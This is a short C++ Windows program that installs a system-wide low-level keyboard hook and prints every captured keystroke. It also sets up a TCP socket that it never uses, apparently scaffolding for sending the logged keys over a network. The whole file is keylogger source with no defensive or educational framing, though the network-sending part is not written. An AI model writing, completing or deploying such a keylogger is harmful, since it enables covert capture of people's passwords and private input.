#include <iostream>
#include <WinSock2.h>

//#pragma comment(lib, "ws2_32.lib")

HHOOK hHock = NULL;

LRESULT CALLBACK MyLowLevelHook(int nCode, WPARAM wParam, LPARAM lParam)
{
	char* wp = "";
	switch(wParam)
	{
	case WM_KEYUP: wp = "KeyUp"; break;
	case WM_KEYDOWN: wp = "KeyDown"; break;
	case WM_SYSKEYDOWN: wp = "SysKeyDown"; break;
	case WM_SYSKEYUP: wp = "SysKeyUp"; break;
	default: wp = "Unknow";
	}

	KBDLLHOOKSTRUCT* hookS = (KBDLLHOOKSTRUCT*)lParam;
	DWORD vkCode = hookS->vkCode;

	printf("%s: %c\n",wp,vkCode);
	return CallNextHookEx(hHock, nCode, wParam, lParam);
	//Message
}

bool InitializeWinSock(SOCKET& soc)
{
	WSADATA wsaDat;
	if (WSAStartup(MAKEWORD(2,0), &wsaDat) != 0)
	{
		printf("Initialization failed.");
		return -1;
	}
	soc = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
	if (soc == INVALID_SOCKET)
	{
		printf("Socket creation failed.");
		return -1;
	}
	return 0;
}

int main()
{
	//Initialize winsocka
	SOCKET Socket;
	if (InitializeWinSock(Socket) != 0)
	{
		return -1;
	}


	MSG msg;
	hHock = SetWindowsHookEx(WH_KEYBOARD_LL, MyLowLevelHook, NULL, NULL);
	
	while (GetMessage(&msg, NULL, 0, 0) > 0) 
	{
		OutputDebugString("Message caught");
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	
	UnhookWindowsHookEx(hHock);

}
